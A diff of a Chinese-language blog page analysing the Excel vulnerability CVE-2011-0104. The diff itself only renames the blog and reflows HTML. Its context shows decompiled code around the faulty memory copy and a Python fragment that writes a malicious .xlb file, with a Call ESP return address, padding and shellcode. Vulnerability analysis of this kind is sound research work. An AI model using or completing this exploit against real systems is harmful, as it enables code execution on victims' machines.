@@ -7,7 +7,7 @@
   <meta name="keywords" content="">
   <meta name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>CVE-2011-0104分析 - Vap0r's Blog</title>
+  <title>CVE-2011-0104分析 - c00c's Blog</title>
 
   <!-- Set render engine for 360 browser -->
   <meta name="renderer" content="webkit">
@@ -43,7 +43,7 @@
 <!--在这里编写你的代码-->
 
 <div id="header">
-	<a href="/">Vap0r's Blog</a>
+	<a href="/">c00c's Blog</a>
 </div>
 
 <div class="am-g body">
@@ -77,8 +77,7 @@
         v11 = dword_308942E4 &lt; 5;
         LOBYTE(v11) = dword_308942E4 &gt;= 5;
         len = &amp;buf[recordLength];
-</code></pre>
-<h5>这里跟着EXP里的数据找，很容易定位到，往下找到有问题的函数</h5>
+</code></pre><h5>这里跟着EXP里的数据找，很容易定位到，往下找到有问题的函数</h5>
 <pre class="lang-c"><code>            if ( HIWORD(ret_addr) &amp; 0x12F &amp;&amp; buf2 &gt;= len )
             {
               recordType = read_buf();
@@ -90,10 +89,9 @@
               buf2 = buf_1 + elementSize * field2 + 3;
               v19 = get_gbuf_size();
               read_buf_len(v5, buf2, len, -3u - v18 + v19);// 问题复制内存函数
-</code></pre>
-<p>为了搞清楚，程序流程，我根据OD的RUNTRACE得到下图
-<img style="height:500px;" alt="data/flow.png" src="data/cve-2011-0104/flow.png">
-可以方便的看到解析数据的执行流程</p>
+</code></pre><p>为了搞清楚，程序流程，我根据OD的RUNTRACE得到下图</p>
+<p style="height:500px;"><img alt="data/flow.png" src="data/cve-2011-0104/flow.png"></p>
+<p>可以方便的看到解析数据的执行流程</p>
 <p>与公共POC不同的地方：</p>
 <pre class="lang-python"><code>        recordType = b"\xA7\x00"    #定值
         recordLenght = b"\x04\x00"
@@ -102,9 +100,7 @@
         field3 = b"\x00"     #不重要
         field4 = b"\x3C\x00" #定值
         field5 = b"\x00\x03" #读取长度
-
         eip = b"\x53\x52\x11\x30"    # Call ESP
-
         fdW = open('exploit2003.xlb', 'wb+')
         fdW.write(str1)
         fdW.write(record)    
@@ -113,15 +109,15 @@
         #fdW.write("\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")      # bypassing a conditional
         fdW.write(b"\x41"*0x24+b"\xF8\xFF\x89\x30"+b"\x41"*(0x2c-0x24-4))     # padding return 2c, addr must writeable      
         fdW.write(shellcode)
-</code></pre>
-<p>这里第二次retn 0x2c才能控制EIP，所以填充一些字节,其中一个特殊值是因为返回前有mov dword ptr [addr], imm32,所以要一个地址保证可写</p>
+</code></pre><p>这里第二次retn 0x2c才能控制EIP，所以填充一些字节,其中一个特殊值是因为返回前有mov dword ptr [addr], imm32,所以要一个地址保证可写</p>
+
 			</div>
 		</div>
 	</div>
 </div>
 
 <div id="footer">
-	<p>&copy;2015-2017 Vap0r's Blog.</p>
+	<p>&copy;2015-2017 c00c's Blog.</p>
 </div>
 
 <!--[if (gte IE 9)|!(IE)]><!-->
